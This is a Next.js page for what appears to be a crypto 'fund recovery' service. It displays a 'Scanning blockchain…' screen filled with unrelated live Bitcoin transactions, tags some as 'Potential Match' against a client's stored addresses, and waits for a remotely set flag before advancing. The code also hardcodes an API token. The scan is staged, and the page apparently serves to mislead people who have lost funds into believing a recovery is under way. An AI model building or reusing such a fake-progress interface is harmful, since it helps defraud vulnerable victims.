"use client";

import { useEffect, useState, useRef } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import {
  collection,
  doc,
  getDocs,
  onSnapshot,
  query,
  where,
  updateDoc,
} from "firebase/firestore";
import { db } from "@/lib/firebase";

const BLOCKCYPHER_TOKEN = "860e4f351ce94d3d9d57c68369059499";
const MAX_TX = 6;

type Tx = { hash: string; total: number; match?: boolean };

export default function Page2Client() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const token = searchParams.get("token");

  const [transactions, setTransactions] = useState<Tx[]>([]);
  const [loading, setLoading] = useState(true);

  const seenHashes = useRef<Set<string>>(new Set());
  const clientId = useRef<string | null>(null);
  const recoveryAddresses = useRef<string[]>([]);

  useEffect(() => {
    if (!token) return;

    const init = async () => {
      const q = query(
        collection(db, "clients"),
        where("accessLinkId", "==", token)
      );

      const snap = await getDocs(q);
      if (snap.empty) return;

      const docSnap = snap.docs[0];
      clientId.current = docSnap.id;

      if (docSnap.data().proceed1 === undefined) {
        await updateDoc(doc(db, "clients", docSnap.id), { proceed1: false });
      }

      const addrSnap = await getDocs(
        collection(db, "clients", docSnap.id, "recovery_addresses")
      );
      recoveryAddresses.current = addrSnap.docs.map((d) => d.data().address);

      onSnapshot(doc(db, "clients", docSnap.id), (snap) => {
        if (snap.data()?.proceed1 === true) {
          router.replace(`/page3?token=${token}`);
        }
      });
    };

    init();
  }, [token, router]);

  useEffect(() => {
    let interval: NodeJS.Timeout;

    const fetchTxs = async () => {
      try {
        const res = await fetch(
          `https://api.blockcypher.com/v1/btc/main/txs?token=${BLOCKCYPHER_TOKEN}`
        );
        const data = await res.json();

        const newTxs: Tx[] = data.map((tx: any) => ({
          hash: tx.hash,
          total: tx.total / 1e8,
          match: tx.outputs?.some((o: any) =>
            recoveryAddresses.current.includes(o.addresses?.[0])
          ),
        }));

        const fresh = newTxs.filter((tx) => !seenHashes.current.has(tx.hash));
        fresh.forEach((tx) => seenHashes.current.add(tx.hash));

        if (fresh.length) {
          setTransactions((prev) => {
            const merged = [...prev, ...fresh];
            return merged.slice(-MAX_TX);
          });
        }

        setLoading(false);
      } catch (e) {
        console.error("BTC fetch error:", e);
      }
    };

    fetchTxs();
    interval = setInterval(fetchTxs, 8000);
    return () => clearInterval(interval);
  }, []);

  return (
    <main className="h-screen w-full flex items-center justify-center bg-black text-white">
      <div className="w-full max-w-lg bg-[#0E111C]/85 p-6 rounded-xl floating">
        <p className="font-semibold mb-4 text-center">Scanning blockchain…</p>

        <div className="flex justify-center mb-6">
          <div className="loader-xl" />
        </div>

        <p className="text-sm mb-2">Transactions found</p>

        <ul className="space-y-2 overflow-hidden">
          {transactions.map((tx) => (
            <li
              key={tx.hash}
              className={`tx-item ${tx.total >= 10 ? "tx-huge" : ""} ${
                tx.total >= 2 && tx.total < 10 ? "tx-large" : ""
              } ${tx.match ? "tx-match" : ""}`}
            >
              <p className="break-all text-xs">{tx.hash}</p>
              <div className="flex justify-between text-xs mt-1">
                <span>{tx.total.toFixed(4)} BTC</span>
                {tx.match && <span className="badge">Potential Match</span>}
              </div>
            </li>
          ))}
        </ul>
      </div>
    </main>
  );
}
